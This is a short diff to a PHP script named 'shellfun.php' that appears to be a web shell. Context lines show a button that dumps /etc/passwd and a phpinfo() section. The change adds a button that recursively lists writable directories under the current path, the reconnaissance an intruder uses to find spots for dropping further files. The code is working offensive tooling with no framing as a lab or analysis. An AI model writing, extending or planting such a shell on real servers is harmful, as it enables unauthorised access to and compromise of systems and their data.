@@ -2,7 +2,7 @@
 
 // shellfun.php
 // WSTN
-// 2015-04-21
+// 2015-05-13
 
 
 //@error_reporting(0);
@@ -117,6 +117,24 @@ if (isset($_POST['passwd_button'])) {
     echo '<pre>';
     echo $etc_passwd;
     echo '</pre><br><br>';
+}
+
+// find writable dirs
+echo <<<EOD
+<form action="" method="post">
+  <button type="submit" name="writedirs_button">writable dirs</button>
+</form><br>
+EOD;
+
+if (isset($_POST['writedirs_button'])) {
+    $path = getcwd();
+    $dirs = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
+    foreach ($dirs as $dir) {
+        if (is_dir($dir) && is_writable($dir)) {
+            echo $dir . '<br>';
+        }
+    }
+    echo '<br><br>';
 }
 
 // phpinfo()
